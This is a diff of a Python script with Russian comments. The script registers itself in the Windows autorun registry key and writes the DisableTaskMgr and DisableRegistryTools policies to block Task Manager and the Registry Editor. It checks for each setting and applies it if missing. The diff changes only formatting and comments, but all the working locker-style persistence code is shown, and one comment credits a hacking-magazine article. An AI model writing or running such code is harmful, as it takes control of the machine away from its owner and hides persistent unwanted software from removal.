@@ -10,18 +10,15 @@ address = os.path.join(pth, p_name)
 def win32():
     # Функция для установки на Windows, которая закидывает файл в реестр автозагрузок.
     pth = os.path.dirname(os.path.realpath(__file__))  # Узнаем, где лежит файл, что указать до него путь
-    p_name = "test_autorun.py"  # Даем название программе.
+    p_name = "test_autorun.py"                         # Указываем название программе.
     address = os.path.join(pth, p_name)  # Склеиваем путь до прогрммы и название, чтобы получить полный путь.
-    tmp = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
-                      reg.KEY_ALL_ACCESS)  # Кидаем в автозагрузки.
+    tmp = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)  # Кидаем в автозагрузки.
     reg.SetValue(tmp, None, reg.REG_SZ, address)
     reg.CloseKey(tmp)
-
 
 def sub_key_system():
     # Создаем sub_key System, т.к. обычно ее нет.
     reg.CreateKey(reg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\\System")
-
 
 def dispetcher():
     # Функция блокировки (невозможности открытия) диспетчера задач.
@@ -33,7 +30,6 @@ def dispetcher():
     SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 1)  # Как в статье на Хакере.
     CloseKey(key)
 
-
 def registry():
     # Функция блокировки (невозможности открытия) встроенного редактора реестра.
     keyVal = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
@@ -44,7 +40,6 @@ def registry():
     SetValueEx(key, "DisableRegistryTools", 0, REG_DWORD, 1)  # Как в статье на Хакере.
     CloseKey(key)
 
-
 # Функция проверки наличия sub_key System (по умолчанию его обычно нет).
 def system():
     key_to_read = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
@@ -54,7 +49,6 @@ def system():
         print("Есть")  # Действие если есть.
     except:
         sub_key_system()  # Действие если нет (например добавить).
-
 
 # Функция проверки наличия ключа блокировки (невозможности открытия) диспетчера задач.
 def proverka_registry():
@@ -73,7 +67,6 @@ def proverka_registry():
     else:
         registry()  # Действие, если ключа нет (например добавление оного).
 
-
 # Функция проверки наличия ключа блокировки (невозможности открытия) встроенного редактора реестра.
 def proverka_dispetcher():
     value = []  # Массив, куда будут записываться все ключи sub_key System.
@@ -90,7 +83,6 @@ def proverka_dispetcher():
         print("OK")  # Действие, если ключ есть.
     else:
         dispetcher()  # Действие, если ключа нет (например добавление оного) .
-
 
 def proverka_autorun():
     value = []  # Массив, куда будут записываться все ключи sub_key System.
@@ -110,6 +102,6 @@ def proverka_autorun():
 
 def main():
     proverka_autorun()  # Проверяем наличие в атозагрузках и если нет, то добавляем.
-    system()  # Проверяем наличие sub_key и если нет, то создаем.
+    system()  # Проверяем наличие sub_key System и если нет, то создаем.
     proverka_dispetcher()  # Проверяем наличие блокировки диспетчера, если блокировки нет, то блокируем.
     proverka_registry()  # Проверяем налачие блокировки редактора регистра, если блокировки нет, то блокируем.
